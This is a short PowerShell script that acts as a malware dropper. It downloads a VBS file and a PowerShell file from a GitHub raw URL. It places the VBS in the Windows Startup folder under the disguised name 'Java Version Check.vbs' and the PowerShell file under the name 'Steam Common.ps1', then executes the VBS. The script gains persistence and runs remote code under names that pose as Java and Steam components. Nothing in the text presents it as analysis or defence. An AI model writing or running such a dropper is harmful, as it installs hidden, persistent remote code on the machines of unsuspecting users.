$destino = Join-Path -Path $env:APPDATA -ChildPath 'Microsoft\Windows\Start Menu\Programs\Startup\Java Version Check.vbs'
$destino2 = Join-Path -Path $env:APPDATA -ChildPath 'Microsoft\Windows\Start Menu\Programs\Steam Common.ps1'
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/miguelsantos029/yolo/refs/heads/main/startup.vbs?dl=1" -OutFile $destino
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/miguelsantos029/yolo/refs/heads/main/loop.ps1?dl=1" -OutFile $destino2
Start-Process -FilePath $destino
exit


